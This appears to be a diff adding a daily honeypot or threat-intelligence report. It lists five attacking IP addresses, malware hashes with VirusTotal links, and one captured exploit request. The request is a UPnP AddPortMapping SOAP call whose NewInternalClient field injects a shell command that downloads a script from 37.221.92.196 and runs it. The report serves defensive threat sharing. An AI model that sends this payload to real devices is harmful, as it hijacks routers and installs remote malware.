@@ -1,0 +1,39 @@
+Top 5 IPs for 22-08-2024 :
+
+122.155.0.205
+41.111.234.136
+89.35.14.168
+103.98.176.134
+152.228.131.33
+
+
+Malware Observed:
+
+File Name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+File Name : xinetd
+b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0
+https://www.virustotal.com/gui/file/b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0
+
+
+608ee011537005f368c9731f4c4dee6a247b620cde52908ed0678df28c617971
+https://www.virustotal.com/gui/file/608ee011537005f368c9731f4c4dee6a247b620cde52908ed0678df28c617971
+
+  
+7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+https://www.virustotal.com/gui/file/7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+
+
+d4e8c642ac8485d2ac316f16b5ed2285c93734c62a3e1bc2852a49f3737053c5
+https://www.virustotal.com/gui/file/d4e8c642ac8485d2ac316f16b5ed2285c93734c62a3e1bc2852a49f3737053c5
+
+Commands/exploits observed
+
+POST /UD/?9 HTTP/1.1
+User-Agent: luna-owns-you
+Content-Type: text/xml
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>/tmp/.e && cd /tmp; >/var/dev/.e && cd /var/dev; wget http://37.221.92.196/w.sh; chmod 777 w.sh; sh w.sh; rm w.sh;`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
